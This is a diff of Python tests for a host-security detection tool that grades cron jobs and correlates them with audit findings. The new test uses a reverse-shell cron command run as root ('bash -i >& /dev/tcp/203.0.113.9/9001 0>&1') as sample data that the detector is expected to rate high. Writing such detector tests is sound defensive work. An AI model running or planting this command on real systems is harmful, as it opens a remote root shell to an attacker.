@@ -291,12 +291,12 @@ def test_finding_already_covered_by_an_equally_severe_detection_is_not_repeated(
 
 
 def test_finding_more_severe_than_its_covering_detection_is_reported_and_linked() -> None:
-    """A reverse-shell cron line: the inventory rules say medium, the audit finding says high."""
+    """A job whose text matches no known pattern is only medium, while the audit says high."""
     ev = [("file", "/etc/cron.d/x")]
     job = rec(
         "scheduled_tasks",
         "cron:/etc/cron.d/x#1",
-        {"command": "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1", "user": "root"},
+        {"command": "/usr/local/bin/updater --quiet", "user": "root"},
         scope="cron",
         evidence=ev,
     )
@@ -307,6 +307,21 @@ def test_finding_more_severe_than_its_covering_detection_is_reported_and_linked(
     assert [c["id"] for c in cron_det["correlated"]] == [fnd["id"]]
     assert [c["id"] for c in fnd["correlated"]] == [cron_det["id"]]
     assert doc["summary"]["total"] == 2
+
+
+def test_reverse_shell_job_is_high_on_its_own_and_absorbs_the_equal_finding() -> None:
+    """With command-content analysis (BO-EXE-002) the job detection already matches the audit."""
+    ev = [("file", "/etc/cron.d/x")]
+    job = rec(
+        "scheduled_tasks",
+        "cron:/etc/cron.d/x#1",
+        {"command": "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1", "user": "root"},
+        scope="cron",
+        evidence=ev,
+    )
+    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
+    assert [d["subject"]["key"] for d in doc["detections"]] == ["cron:/etc/cron.d/x#1"]
+    assert one(doc, "cron:/etc/cron.d/x#1")["severity"] == "high"
 
 
 def test_malformed_finding_entry_is_a_rule_error_not_a_crash_or_a_clean_result() -> None:
